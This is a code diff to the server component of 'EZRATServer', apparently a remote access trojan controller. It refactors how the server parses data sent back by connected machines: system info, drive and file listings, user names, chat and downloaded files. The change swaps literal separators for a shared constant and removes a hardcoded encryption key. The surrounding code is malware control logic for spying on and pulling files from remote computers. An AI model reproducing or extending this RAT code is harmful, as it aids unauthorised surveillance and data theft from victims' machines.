@@ -16,6 +16,7 @@ using EZRATServer.Network;
 using EZRATServer.Utils;
 using EZRATServer.Forms;
 using Timer = System.Windows.Forms.Timer;
+using static EZRATServer.Utils.Constantes;
 
 namespace EZRATServer
 {
@@ -28,7 +29,6 @@ namespace EZRATServer
         private Thread TConnect;
         private int _port = 0;
         private static Socket _serverSocket;
-        private static string EncryptKey = "POULPE212123542345235";
         private uint screenShotNumber = 0;
         FileBrowser fl;
         Chat cht;
@@ -645,7 +645,7 @@ namespace EZRATServer
                     {
                         string[] mainContainer = text.Split(';'); // Get the main data parts
                         int id = int.Parse(mainContainer[1]); //The client ID
-                        string[] lines = mainContainer[2].Split('¦'); //Split the data into parts
+                        string[] lines = mainContainer[2].Split(SeparatorChar); //Split the data into parts
                         string ip = lines[0] + $" : {((IPEndPoint)_clientSockets[id].RemoteEndPoint).Port}"; //The computer's local IPv4 address
                         string name = lines[1]; //The Computer Name
                         string user = lines[2].Substring(lines[2].LastIndexOf('\\') + 1); //The computer's date and time
@@ -657,7 +657,7 @@ namespace EZRATServer
                     else if (text.StartsWith("lsdrives;"))
                     {
                         string[] mainContainer = text.Split(';'); // Get the main data parts
-                        string[] lines = mainContainer[1].Split('¦'); //Split the data into parts
+                        string[] lines = mainContainer[1].Split(SeparatorChar); //Split the data into parts
                         fl.UpdateDrives(lines);
                     }
                     else if (text.StartsWith("lsfiles;"))
@@ -675,7 +675,7 @@ namespace EZRATServer
                     else if (text.StartsWith("chatdata;"))
                     {
                         string msg = text.Substring(9);
-                        string[] result = msg.Split('¦');
+                        string[] result = msg.Split(SeparatorChar);
                         cht.UpdateAllData(result);
                     }
                     else if (text.StartsWith("dlfile;"))
@@ -713,7 +713,7 @@ namespace EZRATServer
                     else if (text.StartsWith("sysinfo;"))
                     {
                         text = text.Substring(8);
-                        string[] lines = text.Split('¦');
+                        string[] lines = text.Split(SeparatorChar);
                         sys.Invoke(new MethodInvoker(() => { sys.UpdateData(lines); }));
 
                     }
@@ -766,7 +766,7 @@ namespace EZRATServer
         private void ReceiveFile(string data, string path)
         {
 
-            string[] textValue = data.Split('|');
+            string[] textValue = data.Split(SeparatorChar);
             byte[] fileData = new byte[textValue.Length];
             for (int i = 0; i < textValue.Length - 1; i++)
             {
